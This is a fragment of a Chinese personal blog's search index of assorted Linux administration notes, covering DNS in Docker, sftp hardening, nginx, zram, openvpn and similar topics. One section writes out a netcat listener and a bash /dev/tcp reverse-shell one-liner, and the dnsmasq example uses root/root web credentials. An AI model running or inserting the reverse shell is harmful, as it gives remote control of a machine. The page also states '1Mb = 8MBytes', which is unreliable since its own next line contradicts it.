","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:1:2","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"DOCKER 创建 DNS SERVER $\u003e vim /data/docker/dns/dnsmasq.conf #dnsmasq config, for a complete example, see: # http://oss.segetech.com/intra/srv/dnsmasq.conf #log all dns queries log-queries #dont use hosts nameservers no-resolv #use cloudflare as default nameservers, prefer 1^4 server=8.8.4.4 server=8.8.8.8 strict-order #serve all .company queries using a specific nameserver server=/company/10.0.0.1 #explicitly define host-ip mappings address=/www.example.com/172.16.10.10 $\u003e docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt \"max-size=100m\" -e \"HTTP_USER=root\" -e \"HTTP_PASS=root\" jpillora/dnsmasq ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:2:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"dotnet 环境搭建 $\u003e rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm $\u003e yum install libgdiplus-devel libunwind icu -y $\u003e wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm $\u003e yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y $\u003e dotnet --info # supervisor 管理 https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86 yum install supervisor -y # 前端管理样式页面 /usr/lib/python2.7/site-packages/supervisor/ui/status.html ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:3:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"在Linux中删除virbr0接口 virbr0是CentOS7在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的 $\u003e virsh net-list $\u003e virsh net-destroy default $\u003e virsh net-undefine default $\u003e systemctl restart libvirtd.service ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:4:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"Linux 杀毒软件 clamav # 需要安装epel源 $\u003e　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd # 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example # 更新病毒库　$\u003e /usr/bin/freshclam # 扫描 $\u003e clamscan -ri /data --remove -l /var/log/clamscan.log ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:5:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux 合并文件系统 margerfs https://wzyboy.im/post/1148.html https://github.com/trapexit/mergerfs 使用示例: # 挂载到的目录必须为空 # 命令挂载 $\u003e mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares # fstab $\u003e /etc/fstab /data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:6:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux sftp 搭建 # 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash) # 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议 # Match Group/User www # 限制某个组或者某个用户使用以下规则 # 仅允许使用sftp , -l INFO 表示记录 SFTP 的 INFO 级别日志。-f AUTH 指定 SFTP 鉴权日志级别为 AUTH ForceCommand internal-sftp -l INFO -f AUTH # 禁止使用密码进行身份验证，只允许通过公钥认证 PasswordAuthentication no # 禁止 SSH 隧道功能 PermitTunnel no # 禁止 SSH 代理转发 AllowAgentForwarding no # 禁止 TCP 转发 AllowTcpForwarding no ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:7:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"监听本地网卡上没有的IP地址 # 一般用于 keepalive + nginx 使用 echo 'net.ipv4.ip_nonlocal_bind = 1' \u003e\u003e /etc/sysctl.conf ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:8:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"腾讯云第二块网卡绑定公网ip 官方文档是有记录的，这儿记录下服务器上的设置 # 网卡初始化 DEVICE=eth1 NM_CONTROLLED=yes ONBOOT=yes IPADDR=\u003c网卡2IP\u003e NETMASK=255.255.240.0 # echo \"10 t1\" \u003e\u003e /etc/iproute2/rt_tables echo \"20 t2\" \u003e\u003e /etc/iproute2/rt_tables /usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10 /usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20 /usr/sbin/ip rule add from 172.21.2.168 table 10 /usr/sbin/ip rule add from 172.21.2.74 table 20 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:9:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"shell 反弹 https://blog.csdn.net/weixin_41082546/article/details/104123131 # 被控端执行 nc -lvp 65535 # 控制端执行 bash -i \u003e\u0026 /dev/tcp/\u003c被控端ip\u003e/65535 0\u003e\u00261 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:10:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"nginx 获取cdn真实用户ip # client_real_ip 即为用户真实IP,可直接用于替换 remote_addr map $http_x_forwarded_for $client_real_ip { \"\" $remote_addr; # fix: 兼容ipv6 ~^(?P\u003cfirstAddr\u003e[0-9a-fA-F:.]+),?.*$ $firstAddr; } ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:11:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 此次问题实际出现是在windows上, 理论上说linux下若使用nat功能可能也会出现该问题(至于为什么用nat,virtualbox似乎并不支持桥接网卡,因此要为虚拟机分配物理ip似乎就只能在物理机绑定多个ip,然后nat转发到虚拟机中), virtualbox在转发80端口时似乎会与物理机的80冲突,从而导致转发无效,这个可能是因为我物理机也启用了IIS的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案. 解决方案 我是用的 windows的端口转发解决的, virtualbox在nat的时候转发一个其他端口(比如8080)到内部的80, 然后在windows 在进行一次转发,将绑定的ip的80端口转发到8080上,这样也可以解决,骚操作看 windows命令收集-端口转发 还有个说的是用管理员身份运行virtualbox,也可以解决,不过我没有验证过 https://www.coder.work/article/6503907 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:12:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"服务器默认端口优化 检查所有非22开启的端口：netstat -lntp $\u003e netstat -lntp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1317/master tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1569/sshd tcp6 0 0 ::1:25 :::* LISTEN 1317/master tcp6 0 0 :::111 :::* LISTEN 1/systemd tcp6 0 0 :::22 :::* LISTEN 1569/sshd 查询/etc/services下端口对应的服务：grep -E \"25|111/\" /etc/services $\u003e grep -E \"\\ 25/|\\ 111/\" /etc/services smtp 25/tcp mail smtp 25/udp mail sunrpc 111/tcp portmapper rpcbind # RPC 4.0 portmapper TCP sunrpc 111/udp portmapper rpcbind # RPC 4.0 portmapper UD 检查服务的运行状态(第三列为服务名称)： systemctl list-unit-files |grep -E \"rpcbind|portmapper|mail\", 若单个端口所映射的服务没有查询到，需要通过运行端口的pid去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。 $\u003e systemctl list-unit-files |grep -E \"rpcbind|portmapper|postfix\" postfix.service enabled rpcbind.service enabled rpcbind.socket enabled rpcbind.target static $\u003e systemctl stop postfix.service rpcbind.service rpcbind.socket # 关闭启动的服务 $\u003e systemctl disable postfix.service rpcbind.service rpcbind.socket # 禁用开机启动 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:13:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux 下hosts文件和dns服务器的响应顺序 通过修改 /etc/nsswitch.conf 进行更换 , 更换/etc/nsswitch.conf: 86中的files和dns的顺序即可 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:14:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"git 提交类型 类型 描述 feat 新增 feature fix 修复 bug docs 仅仅修改了文档，比如README, CHANGELOG, CONTRIBUTE等等 style 仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑 refactor 代码重构，没有加新功能或者修复bug perf 优化相关，比如提升性能、体验 test 测试用例，包括单元测试、集成测试等 chore 改变构建流程、或者增加依赖库、工具等 revert 回滚到上一个版本 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:15:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux 通过s3fs挂载七牛云存储 $\u003e sudo yum install epel-release $\u003e sudo yum install s3fs-fuse $\u003e echo AK:SK \u003e /mnt/.passwd-s3fs $\u003e chmod 600 /mnt/.passwd-s3fs $\u003e s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://s3-cn-north-1.qiniucs.com -o use_path_request_style # -o dbglevel=info -f -o curldbg # 日志信息 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:16:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"普通用户校验是否有权限通过docker.sock操作 docker sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:17:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"rdesktop 远程桌面工具安装 rdesktop 用于linux下的rdp工具，还是非常好用的 $\u003e sudo dnf install rdesktop $\u003e rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator \u003cserver_ip\u003e:\u003cport\u003e -p\u003cpassword\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:18:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"Umask 计算方法 当创建目录时候，目录创建后的权限 = 默认目录最大权限(777) - umask 权限 umask=0022 --\u003e 777 - 022 = 755(目录权限) 当创建文件时候，若umask值所有位数为偶数，则 文件创建后的权限 = 默认文件最大权限(666) - umask权限 umask = 0022 --\u003e 666 - 022 = 644(文件权限) 当创建文件时候，若umask值部分或全部为奇数时候，则 文件创建后的权限 = 默认文件最大权限(666) - umask权限 + umask基数位+1 umask = 0045 --\u003e 666 - 045 = (621 + 001) = 622 umask = 0033 --\u003e 666 - 033 = (633 + 011) = 644 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:19:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"输入输出重定向 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:20:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"文件描述符 文件描述符 文件名 类型 硬件 0 stdin 标准输入文件 键盘 1 stdout 标准输出文件 显示器 2 stderr 标准错误输出文件 显示器 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:20:1","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"标准重定向 https://aimuke.github.io/linux/2019/05/29/redirect/ 类型 表现形式 标准输入重定向 0\u003c或\u003c 追加输入重定向 0\u003c\u003c或\u003c 标准输出重定向 1\u003e或\u003e 标准输出追加重定向 1\u003e\u003e或\u003e\u003e 标准错误重定向 2\u003e 标准错误追加重定向 2\u003e\u003e 标准错误重定向到标准输出 2\u003e\u00261，(cmd \u003e /dev/null 2\u003e\u00261) == (cmd \u003e\u0026 /dev/null) == (cmd \u0026\u003e /dev/null) ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:20:2","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux 下挂载 esxi 的 vmfs 文件系统 vmfs 是esxi的文件系统,物理机使用esxi虚拟化后硬盘的文件格式就是这个. linux下可以直接将其挂在到本地 vmfs-tools是linux挂载vmfs的驱动程序(应该也可以挂在vmdk文件,我没有试过),默认在ubuntu上已获得支持,fedora上可以直接将ubuntu上的安装程序复制过来也可以直接使用. https://github.com/glandium/vmfs-tools # 安装后挂载 vmfs-fuse /dev/sdc1 /mnt/sdc ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:21:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"cp mv 进度条补丁 # 注意尽量不要使用 root 用户操作 # 下载coreutils $ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz $ tar -xJf coreutils-8.32.tar.xz $ cd coreutils-8.32/ # 下载 github 上的补丁 $ wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch # 打补丁，实现进度条显示 $ patch -p1 -i advcpmv-0.8-8.32.patch patching file src/copy.c patching file src/copy.h patching file src/cp.c patching file src/mv.c # 编译安装 $ ./configure $ make # 将打补丁生成的cp和mv命令的二进制文件复制到bin目录下 $ sudo cp src/cp /usr/local/bin/cp $ sudo cp src/mv /usr/local/bin/mv ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:22:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"更改docker容器中的时间而不影响宿主机 $\u003e git clone https://github.com/wolfcw/libfaketime.git $\u003e cd libfaketime $\u003e make $\u003e docker cp ./src/libfaketime.so.1 centos:/usr/lib/ $\u003e docker exec -it centos bash # 修改为指定时间 $\u003e\u003e export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=\"2020-05-01 00:01:00\" # 修改为几天后 $\u003e\u003e export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=\"+2d\" # 恢复 $\u003e\u003e export LD_PRELOAD= ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:23:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"ubuntu/debian切换shell（dash/bash） $\u003e dpkg-reconfigure dash # 弹出窗口选择 \u003cNo\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:24:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"openvpn 指定路由配置 https://blog.csdn.net/joshua317/article/details/120245443 # 在 verb 3 下添加 route-nopull # route-nopull 配置后不会有任何网络请求走openvpn # 当客户端加入 route-nopull 后,所有出去的访问都不从 Openvpn 出去,但可通过添加 vpn_gateway 参数使部分IP访问走 Openvpn 出去 route 172.16.0.0 255.255.0.0 vpn_gateway route 140.143.61.12 255.255.255.255 vpn_gateway ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:25:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"svg 背景透明图片 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e \u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e \u003csvg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"250px\" height=\"269px\" viewBox=\"0 0 250 269\" enable-background=\"new 0 0 250 269\" xml:space=\"preserve\"\u003e \u003cimage id=\"image0\" width=\"250\" height=\"269\" x=\"0\" y=\"0\" href=\"data:image/png;base64,\u003cbase64 code\u003e\" /\u003e \u003c/svg\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:26:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"CentOS 启用zram(服务器内存过低，可用于替代swap) https://fedoraproject.org/wiki/Changes/SwapOnZRAM # 加载内核模块 # num_devices 是 zRAM模块的参数，zram num_devices=1 表示仅创建一个设备文件，该文件将会保存在设备目录，文件名称是 /dev/zram0。 # 如果 num_devices 的数值不等于 1，内核将会创建多个 zram 文件 /dev/zram{0,1,2,3...} # 持久化开启/加载 zRAM 模块 $\u003e echo \"zram\" | sudo tee -a /etc/modules-load.d/zram.conf $\u003e echo \"options zram num_devices=1\" | sudo tee -a /etc/modprobe.d/zram.conf # 持久化 zRAM 配置 disksize: zram(swap)大小(内存的1.5-2倍，内存大于8G，设为8G), comp_algorithm: 压缩算法(fedora 配置 lzo [lzo-rle] lz4 lz4hc 842 zstd，但centos似乎只支持lzo) $\u003e echo 'KERNEL==\"zram0\", ATTR{disksize}=\"512M\", ATTR{comp_algorithm}=\"lzo\", TAG+=\"systemd\"' | sudo tee /etc/udev/rules.d/99-zram.rules # 创建systemd单元，自动挂载 zram (zram会自动叠加已经挂载的swap) $\u003e vim /etc/systemd/system/zram.service [Unit] Description=Swap with zram After=multi-user.target [Service] Type=oneshot RemainAfterExit=true ExecStartPre=/sbin/mkswap /dev/zram0 ExecStart=/sbin/swapon /dev/zram0 ExecStop=/sbin/swapoff /dev/zram0 [Install] WantedBy=multi-user.target # 重启服务器 echo \"512M\" | sudo tee /sys/block/zram0/disksize echo \"lzo\" | sudo tee /sys/block/zram0/comp_algorithm ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:27:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"virtualbox NAT端口映射配置 windows 和 linux命令应一致(只测试过windows)，用于快速批量映射 # VBoxManage natnetwork modify --netname \"10.0.2.0/24\" --port-forward-4 \"名称:协议:[主机ip]:主机端口:[虚拟机ip]:虚拟机端口\" VBoxManage natnetwork modify --netname \"10.0.2.0/24\" --port-forward-4 \"172.16.10.230-2222:tcp:[172.16.10.230]:2222:[10.0.2.230]:2222\" ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:28:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"单位换算 - `MBytes`是`Megabytes`的缩写，表示兆字节。其中，\"`M`\" 代表兆（`Mega`），是一个表示数量级的单位前缀，\"`Bytes`\" 则代表字节。兆字节通常用于描述计算机存储容量的大小，例如硬盘、固态硬盘、内存等存储设备的容量。1 MByte 等于 1024 * 1024 字节，即 1048576 字节。 - `MBits`是`Megabits`的缩写，意思是兆比特(`Mb`)。它表示数据传输速率的单位之一，通常用于测量网络带宽、硬件设备传输速度等。`1Mb = 1*8 = 8MBytes(8MB)` - `1 MB/s`(`Megabytes`/`MBytes`/`兆字节每秒`) 等于 `8 Mb/s`(`兆比特每秒`/`Megabits`/`MBits`)。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:29:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"mailx 